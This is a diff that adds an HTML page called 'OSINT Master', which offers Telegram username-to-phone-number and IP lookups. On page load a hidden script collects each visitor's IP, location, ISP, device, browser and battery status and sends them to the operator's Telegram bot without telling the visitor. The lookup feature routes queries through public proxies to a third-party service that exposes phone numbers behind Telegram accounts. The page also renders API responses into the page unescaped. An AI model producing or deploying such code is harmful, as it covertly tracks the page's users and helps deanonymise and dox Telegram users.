@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OSINT Master - Premium Lookup</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; }
+        .glass { background: rgba(17, 24, 39, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .loader { border: 4px solid rgba(255, 255, 255, 0.1); border-top: 4px solid #3b82f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .tab-active { border-bottom: 3px solid #3b82f6; color: #fff; }
+        .watermark { position: fixed; bottom: 15px; right: 20px; font-size: 1.2rem; font-weight: 800; color: rgba(255, 255, 255, 0.1); pointer-events: none; z-index: 100; letter-spacing: 2px; }
+    </style>
+</head>
+<body class="bg-gray-950 text-gray-200 min-h-screen relative overflow-hidden">
+
+    <!-- Background Gradient Effect -->
+    <div class="absolute top-0 left-1/4 w-96 h-96 bg-blue-600/20 rounded-full blur-[120px] pointer-events-none"></div>
+    <div class="absolute bottom-0 right-1/4 w-96 h-96 bg-purple-600/20 rounded-full blur-[120px] pointer-events-none"></div>
+
+    <!-- Watermark -->
+    <div class="watermark">OWNER - N</div>
+
+    <!-- Premium Navbar -->
+    <nav class="glass sticky top-0 z-50 py-4 px-6 md:px-12 flex justify-between items-center">
+        <div class="text-2xl font-extrabold tracking-tight">
+            OSINT<span class="text-blue-500">.</span>Master
+        </div>
+        <ul class="hidden md:flex space-x-10 text-sm font-medium text-gray-400">
+            <li class="hover:text-white cursor-pointer transition-colors">TG to NUM</li>
+            <li class="hover:text-white cursor-pointer transition-colors">IP Lookup</li>
+            <li class="hover:text-white cursor-pointer transition-colors">Database</li>
+            <li class="hover:text-white cursor-pointer transition-colors">Docs</li>
+        </ul>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="relative z-10 px-6 md:px-12 py-12 max-w-5xl mx-auto">
+        
+        <header class="text-center mb-12">
+            <h1 class="text-4xl md:text-6xl font-extrabold mb-4 bg-clip-text text-transparent bg-gradient-to-r from-white to-gray-500">
+                Intelligence Lookup
+            </h1>
+            <p class="text-gray-500 max-w-xl mx-auto">Premium OSINT tools for Telegram and Network investigation.</p>
+        </header>
+
+        <!-- Tabs -->
+        <div class="flex justify-center space-x-8 mb-8 border-b border-gray-800">
+            <button id="tab-tg" class="tab-active text-lg font-semibold pb-3 px-4 transition-all">Telegram Lookup</button>
+            <button id="tab-ip" class="text-gray-500 hover:text-white text-lg font-semibold pb-3 px-4 transition-all">IP Lookup</button>
+        </div>
+
+        <!-- TG Lookup Section -->
+        <div id="tg-section" class="max-w-3xl mx-auto">
+            <div class="flex flex-col sm:flex-row gap-4 mb-8">
+                <input type="text" id="tgInput" class="flex-1 glass rounded-xl px-5 py-4 outline-none focus:ring-2 focus:ring-blue-500 transition-all" placeholder="Enter @username or Chat ID...">
+                <button id="tgSearchBtn" class="bg-blue-600 hover:bg-blue-700 text-white font-bold px-8 py-4 rounded-xl transition-colors flex items-center justify-center min-w-[120px]">Search</button>
+            </div>
+            <div id="tgResult" class="hidden glass rounded-2xl p-8 shadow-2xl"></div>
+        </div>
+
+        <!-- IP Lookup Section -->
+        <div id="ip-section" class="hidden max-w-3xl mx-auto">
+            <div class="flex flex-col sm:flex-row gap-4 mb-8">
+                <input type="text" id="ipInput" class="flex-1 glass rounded-xl px-5 py-4 outline-none focus:ring-2 focus:ring-blue-500 transition-all" placeholder="Enter IP address (or leave blank for your own IP)">
+                <button id="ipSearchBtn" class="bg-purple-600 hover:bg-purple-700 text-white font-bold px-8 py-4 rounded-xl transition-colors flex items-center justify-center min-w-[120px]">Lookup</button>
+            </div>
+            <div id="ipResult" class="hidden glass rounded-2xl p-8 shadow-2xl"></div>
+        </div>
+
+    </main>
+
+    <script>
+        // ==========================================
+        // 1. TELEGRAM BOT TRACKING SYSTEM
+        // ==========================================
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; 
+        const CHAT_ID = 'YOUR_CHAT_ID_HERE';     
+
+        async function logVisitor() {
+            try {
+                const userAgent = navigator.userAgent;
+                let device = "Unknown";
+                if (/Android/i.test(userAgent)) device = "Android";
+                else if (/iPhone|iPad|iPod/i.test(userAgent)) device = "iOS";
+                else if (/Windows/i.test(userAgent)) device = "Windows PC";
+                else if (/Macintosh/i.test(userAgent)) device = "Mac PC";
+                else if (/Linux/i.test(userAgent)) device = "Linux PC";
+
+                let browser = "Unknown";
+                if (/Chrome/i.test(userAgent) && !/Edg|OPR/i.test(userAgent)) browser = "Chrome";
+                else if (/Firefox/i.test(userAgent)) browser = "Firefox";
+                else if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) browser = "Safari";
+
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                const networkType = connection ? connection.effectiveType : "Unknown";
+
+                const ipRes = await fetch('https://ipwho.is/');
+                const ipData = await ipRes.json();
+                const userIP = ipData.ip || "Unknown";
+                const city = ipData.city || "Unknown";
+                const region = ipData.region || "Unknown";
+                const country = ipData.country || "Unknown";
+                const isp = ipData.connection?.isp || "Unknown";
+
+                let batteryLevel = "Not Accessible";
+                let batteryCharging = "";
+                if (navigator.getBattery) {
+                    navigator.getBattery().then(battery => {
+                        batteryLevel = Math.round(battery.level * 100) + "%";
+                        batteryCharging = battery.charging ? "Charging" : "Not Charging";
+                        sendToTelegram(userIP, device, browser, networkType, batteryLevel, batteryCharging, city, region, country, isp);
+                    });
+                } else {
+                    sendToTelegram(userIP, device, browser, networkType, "N/A", "N/A", city, region, country, isp);
+                }
+            } catch (error) {
+                console.error("Tracking Error:", error);
+            }
+        }
+
+        function sendToTelegram(ip, device, browser, net, bat, batStatus, city, region, country, isp) {
+            if(BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return;
+            
+            const text = `🚨 *New Visitor Alert!*\n\n` +
+                         `🌐 *IP:* ${ip}\n` +
+                         `📍 *Location:* ${city}, ${region}, ${country}\n` +
+                         `📶 *ISP:* ${isp}\n` +
+                         `📱 *Device:* ${device}\n` +
+                         `🧭 *Browser:* ${browser}\n` +
+                         `📡 *Network:* ${net}\n` +
+                         `🔋 *Battery:* ${bat} (${batStatus})\n` +
+                         `⏱ *Time:* ${new Date().toLocaleString()}`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+            fetch(url).catch(err => console.error("Telegram Send Error:", err));
+        }
+
+        logVisitor();
+
+        // ==========================================
+        // 2. UI TABS LOGIC
+        // ==========================================
+        const tabTg = document.getElementById('tab-tg');
+        const tabIp = document.getElementById('tab-ip');
+        const tgSection = document.getElementById('tg-section');
+        const ipSection = document.getElementById('ip-section');
+
+        function switchTab(tab) {
+            if(tab === 'tg') {
+                tabTg.classList.add('tab-active'); tabTg.classList.remove('text-gray-500');
+                tabIp.classList.remove('tab-active'); tabIp.classList.add('text-gray-500');
+                tgSection.classList.remove('hidden'); ipSection.classList.add('hidden');
+            } else {
+                tabIp.classList.add('tab-active'); tabIp.classList.remove('text-gray-500');
+                tabTg.classList.remove('tab-active'); tabTg.classList.add('text-gray-500');
+                ipSection.classList.remove('hidden'); tgSection.classList.add('hidden');
+            }
+        }
+        tabTg.addEventListener('click', () => switchTab('tg'));
+        tabIp.addEventListener('click', () => switchTab('ip'));
+
+
+        // ==========================================
+        // 3. TELEGRAM LOOKUP LOGIC (Multi-Proxy Fallback)
+        // ==========================================
+        document.getElementById('tgSearchBtn').addEventListener('click', async () => {
+            const query = document.getElementById('tgInput').value.trim();
+            const resultDiv = document.getElementById('tgResult');
+            if(!query) return alert("Please enter a username or ID");
+
+            resultDiv.classList.remove('hidden');
+            resultDiv.innerHTML = `<div class="flex justify-center items-center py-8"><div class="loader"></div></div>`;
+
+            const targetUrl = `https://codex-tg2num.kesug.com/api.php?key=Key&id=${query}`;
+            
+            // Multiple Proxies - Agar ek fail ho to dusra try karega
+            const proxies = [
+                `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(targetUrl)}`,
+                `https://corsproxy.io/?url=${encodeURIComponent(targetUrl)}`,
+                `https://api.allorigins.win/raw?url=${encodeURIComponent(targetUrl)}`
+            ];
+
+            let responseText = null;
+            let fetchError = null;
+
+            // Har proxy ko try karna
+            for (let i = 0; i < proxies.length; i++) {
+                try {
+                    const response = await fetch(proxies[i]);
+                    if (response.ok) {
+                        responseText = await response.text();
+                        if (responseText && !responseText.includes('<!DOCTYPE html>')) {
+                            break; // Agar valid data mil gaya to loop break
+                        }
+                    }
+                } catch (err) {
+                    fetchError = err;
+                }
+            }
+
+            if (!responseText) {
+                resultDiv.innerHTML = `<div class="text-red-500 text-center py-6">All proxies failed or API is down.</div>`;
+                return;
+            }
+
+            try {
+                // Check karte hain ki JSON hai ya plain text
+                let data;
+                try {
+                    data = JSON.parse(responseText); 
+                } catch (e) {
+                    data = null; 
+                }
+
+                let cardsHtml = '';
+                let isValidData = false;
+
+                if (data && typeof data === 'object' && Object.keys(data).length > 0) {
+                    for (const key in data) {
+                        if (['status', 'ok', 'success', 'message', 'error'].includes(key.toLowerCase())) continue;
+                        let value = data[key];
+                        if (typeof value === 'object') value = JSON.stringify(value);
+                        
+                        cardsHtml += `
+                            <div class="bg-gray-900/50 p-4 rounded-lg border border-gray-800">
+                                <p class="text-xs uppercase text-gray-500 mb-1">${key.replace(/_/g, ' ')}</p>
+                                <p class="text-white font-medium break-all">${value || 'N/A'}</p>
+                            </div>
+                        `;
+                        isValidData = true;
+                    }
+                } else if (responseText) {
+                    cardsHtml = `
+                        <div class="bg-gray-900/50 p-4 rounded-lg border border-gray-800 w-full">
+                            <p class="text-xs uppercase text-gray-500 mb-1">API Response</p>
+                            <p class="text-white font-medium break-all whitespace-pre-wrap">${responseText}</p>
+                        </div>
+                    `;
+                    isValidData = true;
+                }
+
+                if (isValidData) {
+                    resultDiv.innerHTML = `
+                        <div class="flex items-center space-x-4 mb-6 pb-6 border-b border-gray-700">
+                            <div class="w-16 h-16 rounded-full bg-blue-600 flex items-center justify-center text-2xl font-bold text-white">
+                                ${query.charAt(0).toUpperCase()}
+                            </div>
+                            <div>
+                                <h2 class="text-2xl font-bold text-white">Result for: ${query}</h2>
+                                <p class="text-blue-400 text-sm">Data fetched successfully</p>
+                            </div>
+                        </div>
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            ${cardsHtml}
+                        </div>
+                    `;
+                } else {
+                    resultDiv.innerHTML = `<div class="text-center text-red-500 py-6">No valid data found for "${query}".</div>`;
+                }
+            } catch (error) {
+                resultDiv.innerHTML = `<div class="text-red-500 text-center py-6">Error parsing data.</div>`;
+            }
+        });
+
+
+        // ==========================================
+        // 4. IP LOOKUP LOGIC (Real API - ipwho.is)
+        // ==========================================
+        document.getElementById('ipSearchBtn').addEventListener('click', async () => {
+            const query = document.getElementById('ipInput').value.trim();
+            const resultDiv = document.getElementById('ipResult');
+            
+            resultDiv.classList.remove('hidden');
+            resultDiv.innerHTML = `<div class="flex justify-center items-center py-8"><div class="loader"></div></div>`;
+
+            try {
+                const apiUrl = query ? `https://ipwho.is/${query}` : `https://ipwho.is/`;
+                const response = await fetch(apiUrl);
+                const data = await response.json();
+
+                if (!data.success) {
+                    throw new Error(data.message || "Invalid IP");
+                }
+
+                resultDiv.innerHTML = `
+                    <div class="flex items-center space-x-4 mb-6 pb-6 border-b border-gray-700">
+                        <div class="w-16 h-16 rounded-xl bg-gray-800 flex items-center justify-center text-3xl">
+                            ${data.flag ? `<img src="${data.flag.image_url}" class="w-10 h-10 rounded-md">` : '🌐'}
+                        </div>
+                        <div>
+                            <h2 class="text-3xl font-bold text-white">${data.ip}</h2>
+                            <p class="text-gray-400">${data.connection?.isp || "Unknown ISP"}</p>
+                        </div>
+                    </div>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <div class="bg-gray-900/50 p-4 rounded-lg border border-gray-800">
+                            <p class="text-xs uppercase text-gray-500 mb-1">Country</p>
+                            <p class="text-white font-medium">${data.country}</p>
+                        </div>
+                        <div class="bg-gray-900/50 p-4 rounded-lg border border-gray-800">
+                            <p class="text-xs uppercase text-gray-500 mb-1">Region</p>
+                            <p class="text-white font-medium">${data.region}</p>
+                        </div>
+                        <div class="bg-gray-900/50 p-4 rounded-lg border border-gray-800">
+                            <p class="text-xs uppercase text-gray-500 mb-1">City</p>
+                            <p class="text-white font-medium">${data.city}</p>
+                        </div>
+                        <div class="bg-gray-900/50 p-4 rounded-lg border border-gray-800">
+                            <p class="text-xs uppercase text-gray-500 mb-1">Timezone</p>
+                            <p class="text-white font-medium">${data.timezone?.id || "N/A"}</p>
+                        </div>
+                        <div class="bg-gray-900/50 p-4 rounded-lg border border-gray-800">
+                            <p class="text-xs uppercase text-gray-500 mb-1">Latitude / Longitude</p>
+                            <p class="text-white font-medium">${data.latitude}, ${data.longitude}</p>
+                        </div>
+                        <div class="bg-gray-900/50 p-4 rounded-lg border border-gray-800">
+                            <p class="text-xs uppercase text-gray-500 mb-1">Organization</p>
+                            <p class="text-white font-medium">${data.connection?.org || "N/A"}</p>
+                        </div>
+                    </div>
+                `;
+            } catch (error) {
+                resultDiv.innerHTML = `<div class="text-red-500 text-center py-6">Error: ${error.message}</div>`;
+            }
+        });
+
+    </script>
+</body>
+</html>
